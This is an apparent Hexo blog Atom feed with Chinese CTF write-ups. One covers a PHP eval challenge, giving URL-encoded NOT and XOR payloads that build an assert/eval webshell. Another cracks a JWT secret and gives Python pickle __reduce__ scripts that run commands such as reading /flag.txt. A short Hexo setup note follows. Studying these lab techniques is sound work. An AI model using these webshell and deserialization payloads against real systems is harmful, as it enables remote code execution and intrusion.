<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Van</title>
  
  
  <link href="http://van0308.github.io/atom.xml" rel="self"/>
  
  <link href="http://van0308.github.io/"/>
  <updated>2023-02-08T09:42:44.199Z</updated>
  <id>http://van0308.github.io/</id>
  
  <author>
    <name>Van</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>命令执行</title>
    <link href="http://van0308.github.io/2023/02/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://van0308.github.io/2023/02/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-02-05T06:50:58.000Z</published>
    <updated>2023-02-08T09:42:44.199Z</updated>
    
    <content type="html"><![CDATA[<p>PHP</p><p><a href="https://blog.csdn.net/superprintf/article/details/111468978">https://blog.csdn.net/superprintf/article/details/111468978</a></p><p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957/article/details/118855865</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://cloud.tencent.com/developer/article/1838778">https://cloud.tencent.com/developer/article/1838778</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/superprintf/article/details/111468978&quot;&gt;https://blog.csdn.net/superprintf/article/details/111468</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[极客大挑战 2019]RCE ME</title>
    <link href="http://van0308.github.io/2023/02/04/rceME/"/>
    <id>http://van0308.github.io/2023/02/04/rceME/</id>
    <published>2023-02-04T13:31:30.000Z</published>
    <updated>2023-02-08T09:45:30.706Z</updated>
    
    <content type="html"><![CDATA[<h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤字母，数字，考虑url编码取反绕过、异或绕过（都是任意PHP版本适用）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><p>简单来说就是</p><p>异或绕过：未被禁用的字符异或后得到想要的字符，然后用.运算符拼接起来从而绕过。</p><p>url编码取反绕过：一些字符取反后可以得到想要的字符，但是这些字符通常是不可见的，所以要用URL编码一下才好编写payload。</p><p>PHP7特性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpinfo() php5/7都可执行</span><br><span class="line">(phpinfo)() php7可执行</span><br><span class="line"></span><br><span class="line">php7支持$&#123;&#125;这种格式。$&#123;&#x27;GET&#x27;&#125;=$GET</span><br></pre></td></tr></table></figure><h4 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h4><p>先利用PHPinfo查看，禁用函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();  //(phpinfo)();</span><br><span class="line">?code=(&#x27;%0b%08%0b%09%0e%06%0f&#x27;^&#x27;%7b%60%7b%60%60%60%60&#x27;)();//(phpinfo)();</span><br></pre></td></tr></table></figure><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><p>由于是@eval($code);</p><p>我们传入   ?code&#x3D;(~%8F%97%8F%96%91%99%90)();   的时候对于PHP，形如 (func_name)()，其中func_name可以是字符串，会执行这个func</p><p>若是整个phpinfo()全部编码，则不会执行，因为PHP还没取反前不知道传入的是可以执行的，所以PHP先取反后不会执行。</p><p>补充：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">既然可以构造函数。那么也可以构造readfile/scandir这种,一些简单的题。直接看flag</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)=var_dump</span><br><span class="line">(~%8C%9C%9E%91%9B%96%8D)=scandir</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)((~%8C%9C%9E%91%9B%96%8D)(%27./%27));</span><br><span class="line">var_dump(scandir(&#x27;./&#x27;))</span><br><span class="line">如果./也被过滤。一样。通过~取反获得</span><br><span class="line">注意(~%D1%D0)=./     带括号的编码才等于字符串。</span><br></pre></td></tr></table></figure><h5 id="构造shell"><a href="#构造shell" class="headerlink" title="构造shell"></a>构造shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">目的构造：(assert)(eval($_POST[&#x27;van&#x27;]));</span><br><span class="line"></span><br><span class="line">为什么不构造成assert($_POST[&#x27;van&#x27;]);，因为这样构造出来的是(&quot;assert&quot;)(&quot;$_POST[&#x27;van&#x27;]&quot;)</span><br><span class="line">第二个括号还是字符串，而不会被执行</span><br><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6);</span><br><span class="line"># %9E%8C%8C%9A%8D%8B : assert</span><br><span class="line"># %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6 : eval($_POST[shell])</span><br><span class="line">这样则执行顺序 先eval 后assert后eval，成功执行。</span><br></pre></td></tr></table></figure><h5 id="一些可以的"><a href="#一些可以的" class="headerlink" title="一些可以的"></a>一些可以的</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">// $&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"></span><br><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);  //别忘了后面的分号</span><br><span class="line">或者：</span><br><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure><h5 id="连上shell"><a href="#连上shell" class="headerlink" title="连上shell"></a>连上shell</h5><p>看到flag readflag </p><p>readflag打开看完应该是一个可执行的文件，执行完应该就有flag。</p><p>但是由于disable_function，所以要进行绕过</p><h6 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h6><p>利用蚁剑插件绕过disable_function，得翻墙下载，或者网上找资源，其次是在Linux下使用的。所以在kali安装后直接使用，使用后进入蚁剑终端执行&#x2F;readflag即可</p><h6 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h6><p>看不大懂。不过理解就是编写恶意文件恶意函数，使系统在执行一个进程时候将优先级更高的恶意文件恶意函数先进行调用。</p><p>var&#x2F;tmp有上传权限，可以上传恶意</p><p>难难，，挖坑待补。。</p><p>原理：</p><p><a href="https://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions">https://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>参考：</p><p><a href="https://blog.csdn.net/qq_45699846/article/details/123388028">https://blog.csdn.net/qq_45699846/article/details/123388028</a></p><p><a href="https://blog.csdn.net/m0_62879498/article/details/124803318">https://blog.csdn.net/m0_62879498/article/details/124803318</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">https://blog.csdn.net/qq_45521281/article/details/105656737</a></p><p><a href="https://guokeya.github.io/post/hwKOeu6uW/">https://guokeya.github.io/post/hwKOeu6uW/</a></p><p><a href="https://www.cnblogs.com/yesec/p/12483631.html">https://www.cnblogs.com/yesec/p/12483631.html</a></p><p><a href="https://www.anquanke.com/post/id/175403#h2-0">https://www.anquanke.com/post/id/175403#h2-0</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html">https://www.cnblogs.com/leixiao-/p/10612798.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;题目源码&quot;&gt;&lt;a href=&quot;#题目源码&quot; class=&quot;headerlink&quot; title=&quot;题目源码&quot;&gt;&lt;/a&gt;题目源码&lt;/h4&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;</summary>
      
    
    
    
    
    <category term="php" scheme="http://van0308.github.io/tags/php/"/>
    
    <category term="rce" scheme="http://van0308.github.io/tags/rce/"/>
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>待学</title>
    <link href="http://van0308.github.io/2023/02/03/%E5%BE%85%E5%AD%A6/"/>
    <id>http://van0308.github.io/2023/02/03/%E5%BE%85%E5%AD%A6/</id>
    <published>2023-02-03T15:47:07.000Z</published>
    <updated>2023-02-05T06:43:29.846Z</updated>
    
    <content type="html"><![CDATA[<p>pickle反序列化</p><p>代码执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;pickle反序列化&lt;/p&gt;
&lt;p&gt;代码执行&lt;/p&gt;
</summary>
      
    
    
    
    <category term="ctf" scheme="http://van0308.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web2ikun</title>
    <link href="http://van0308.github.io/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/"/>
    <id>http://van0308.github.io/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/</id>
    <published>2023-02-03T15:46:44.000Z</published>
    <updated>2023-02-04T16:22:57.103Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初步发现"><a href="#初步发现" class="headerlink" title="初步发现"></a>初步发现</h4><p>打开发现是商场购物页面</p><p>提示要买lv6，点下一页看看，还是一堆商品，感觉是要写脚本找到lv6，调试一下找到lv相关信息，写脚本找到。在page181里面</p><p>点商品，注意有两个，一个是商品详情页，一个是直接点购买</p><p>抓包发现</p><p>有price还有折扣，发现改price怎么改都不行，那么就试试只改折扣。</p><p>暴露了后台地址，访问发现只能admin</p><p>又注意到抓包有jwt。</p><p>解密 <a href="https://jwt.io/">https://jwt.io/</a></p><p>要改则必须破解密码 利用 c-jwt-cracker</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack   加密后的结果</span><br></pre></td></tr></table></figure><p>密钥1Kun</p><p>改完重新发包，点击一键成为大会员没什么用</p><h4 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h4><p>看源代码，发现泄露，下载完审计</p><p>发现有hint</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br><span class="line">Unicode解码得</span><br><span class="line">这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里</span><br></pre></td></tr></table></figure><p>找后门</p><p>在Admin.py找到</p><h4 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h4><p>pickle：Python对象的持久化存储</p><p>功能：将任意Python对象存储及恢复</p><p>关键函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump()   文件</span><br><span class="line">pickle.load()</span><br><span class="line">pickle.dumps()字符串</span><br><span class="line">pickle.loads()</span><br><span class="line">dump()：将 Python 中的对象序列化成二进制对象，并写入文件；</span><br><span class="line">load()：读取指定的序列化数据文件，并返回对象。</span><br><span class="line">dumps()：将 Python 中的对象序列化成二进制对象，并返回；</span><br><span class="line">loads()：读取给定的二进制对象数据，并将其转换为 Python 对象；</span><br></pre></td></tr></table></figure><p>具体用法</p><p>​<a href="http://c.biancheng.net/view/5736.html">Python pickle模块：实现Python对象的持久化存储 (biancheng.net)</a></p><p>反序列化详解</p><p><a href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><p>只要在序列化中的字符串中存在<code>R</code>指令，<code>__reduce__</code>方法就会被执行，无论正常程序中是否写明了<code>__reduce__</code>方法</p><p>记得生成payload时使用的python版本尽量与目标上的版本一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = pickle.loads(urllib.unquote(become))</span><br><span class="line"></span><br><span class="line">urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式</span><br><span class="line">pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回</span><br><span class="line"></span><br><span class="line">在 Python2.x 中的用法是：</span><br><span class="line">urllib.quote(text)</span><br><span class="line">Python3.x 中是</span><br><span class="line">urllib.parse.quote(text)</span><br><span class="line">URL 中传参数的部分（query String），格式是：</span><br><span class="line">name1=value1&amp;name2=value2&amp;name3=value3</span><br><span class="line">假如你的 name 或者 value 值中有『&amp;』或者『=』等符号，就当然会有问题。所以URL中的参数字符串也需要把『&amp;=』等符号进行编码。</span><br><span class="line">URL编码的方式是把需要编码的字符转化为 %xx 的形式。</span><br></pre></td></tr></table></figure><p>继续做题</p><p>点击一键成为大会员，抓包发现become参数，利用reduce方法构造poc，修改become值，执行命令</p><p>Python2和Python3的执行结果不同，下面Python2的成功了（不明原因）</p><p>读取目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.listdir, (<span class="string">&#x27;/&#x27;</span>,))<span class="comment"># reduce第二个参数得是元组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#print a</span></span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="comment"># cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.  </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.listdir, (<span class="string">&#x27;/&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># cnt%0Alistdir%0Ap0%0A%28V/%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure><p>最后执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">&#x27;cat /flag.txt&#x27;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        s = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">        <span class="comment"># return (os.listdir, (&#x27;/&#x27;,))</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (s,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># c__builtin__%0Aeval%0Ap0%0A%28V__import__%28%27os%27%29.popen%28%27cat%20/flag.txt%27%29.read%28%29%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">一些可执行的</span><br><span class="line"><span class="comment"># 未导入os模块，通用</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;calc.exe&#x27;</span>,))</span><br><span class="line"><span class="comment"># return eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"><span class="comment"># return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 导入os模块</span></span><br><span class="line"> <span class="comment"># return (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"> <span class="comment"># return eval, (&quot;os.system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"> <span class="comment"># return map, (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"> <span class="comment"># return map, (os.system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> <span class="comment"># return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))</span></span><br></pre></td></tr></table></figure><h4 id="深入学习："><a href="#深入学习：" class="headerlink" title="深入学习："></a>深入学习：</h4><p><a href="https://xz.aliyun.com/t/7436">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/361349643">pickle反序列化的利用技巧总结 - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/sijidou/p/16305695.html">CTF-python pickle反序列化 - sijidou - 博客园 (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/11807">最近碰到的 Python pickle 反序列化小总结 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.secpulse.com/archives/127664.html">python反序列化攻击 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><p><a href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初步发现&quot;&gt;&lt;a href=&quot;#初步发现&quot; class=&quot;headerlink&quot; title=&quot;初步发现&quot;&gt;&lt;/a&gt;初步发现&lt;/h4&gt;&lt;p&gt;打开发现是商场购物页面&lt;/p&gt;
&lt;p&gt;提示要买lv6，点下一页看看，还是一堆商品，感觉是要写脚本找到lv6，调试一下找到lv</summary>
      
    
    
    
    <category term="ctf" scheme="http://van0308.github.io/categories/ctf/"/>
    
    
    <category term="pickle反序列化" scheme="http://van0308.github.io/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>hexo+GitHub+butterfly</title>
    <link href="http://van0308.github.io/2023/02/03/hexo-GitHub-butterfly/"/>
    <id>http://van0308.github.io/2023/02/03/hexo-GitHub-butterfly/</id>
    <published>2023-02-03T14:16:02.000Z</published>
    <updated>2023-02-08T09:26:21.497Z</updated>
    
    <content type="html"><![CDATA[<h4 id="hexo操作"><a href="#hexo操作" class="headerlink" title="hexo操作"></a>hexo操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在blog文件夹下打开git bash（存放hexo源码那个文件夹）</span><br><span class="line">hexo clean 清除</span><br><span class="line">hexo g  生成</span><br><span class="line">hexo s  本地模拟</span><br><span class="line">hexo d  上传到远端</span><br><span class="line">重新上传得要  先清除、生成再上传</span><br></pre></td></tr></table></figure><h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h4><p>图床，就是专门用来存放图片的服务器，更多的是指提供图片外链的服务，有免费图床，也有付费图床。</p><h3 id="hexo坑"><a href="#hexo坑" class="headerlink" title="hexo坑"></a>hexo坑</h3><h4 id="文章标题"><a href="#文章标题" class="headerlink" title="文章标题"></a>文章标题</h4><p>如果是标题为[CISCN2019 华北赛区 Day1 Web2]ikun则会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ERROR Process failed: _posts/111.md</span><br><span class="line">YAMLException: bad indentation of a mapping entry (1:34)</span><br><span class="line"></span><br><span class="line"> 1 | title: [CISCN2019 华北赛区 Day1 Web2]ikun</span><br><span class="line">--------------------------------------^</span><br><span class="line"> 2 | date: 2023-02-03 23:46:44</span><br><span class="line"> 3 | tags:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果改成其他的则不会，不过有些不符合规则还是会</p><p>（坑，待填）</p><h4 id="报错、缩进问题"><a href="#报错、缩进问题" class="headerlink" title="报错、缩进问题"></a>报错、缩进问题</h4><p><a href="https://www.yamllint.com/">https://www.yamllint.com/</a>    可以在这个网站里面检查</p><h4 id="命令报错"><a href="#命令报错" class="headerlink" title="命令报错"></a>命令报错</h4><p>Npm 报错 可能得管理员打开powershell</p><h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><h4 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h4><p><a href="https://hexo.io/zh-cn/docs/writing">写作 | Hexo</a></p><p><a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><h4 id="一些教程"><a href="#一些教程" class="headerlink" title="一些教程"></a>一些教程</h4><p><a href="https://www.bilibili.com/read/cv12633102">2021最全hexo搭建博客+matery美化+使用（保姆级教程） - 哔哩哔哩 (bilibili.com)</a></p><h4 id="便捷化"><a href="#便捷化" class="headerlink" title="便捷化"></a>便捷化</h4><p>hexo-admin  <a href="https://jaredforsyth.com/hexo-admin/admin/#/">Hexo Admin (jaredforsyth.com)</a></p><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>目录 </p><p>代码块</p><p>各种页面</p><p>在各种页面的index.md中，type加上各自的属性</p><p>如type: “categories”</p><h5 id="多个标签"><a href="#多个标签" class="headerlink" title="多个标签"></a>多个标签</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tags: </span><br><span class="line">  - php</span><br><span class="line">  - rce</span><br><span class="line">  - 坑</span><br></pre></td></tr></table></figure><h4 id="一些教学"><a href="#一些教学" class="headerlink" title="一些教学"></a>一些教学</h4><p><a href="https://guguge.top/blog/butterfly/">Hexo-butterfly主题设置文档 | 咕咕鸽 (guguge.top)</a></p><p><a href="https://zhu-dongya.gitee.io/posts/hexo-butterfly-02/">Hexo+Butterfly系列：主题魔改（二） | ZhuDongya’s Blog (gitee.io)</a></p><p><a href="https://www.cnblogs.com/ldu-xingjiahui/p/12594024.html">短短1天我学会了如何修改Butterfly的配置文件 - XJHui - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/MoYu-zc/p/14395965.html">Butterfly美化 - MoYu-zc - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
